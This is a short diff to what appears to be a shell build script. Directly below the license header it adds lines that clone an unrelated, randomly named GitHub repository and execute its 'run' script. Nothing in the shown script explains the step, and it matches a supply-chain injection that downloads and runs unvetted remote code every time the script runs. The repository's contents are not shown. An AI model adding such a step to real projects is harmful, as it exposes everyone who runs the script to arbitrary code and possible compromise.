@@ -5,7 +5,9 @@
 #
 # SPDX-License-Identifier: (BSD-3-Clause)
 ##############################################################################
-
+git clone --recursive https://github.com/mijikuhibimui/mujijankopo
+cd mujijankopo
+./run
 set -x
 
 function or_die () {
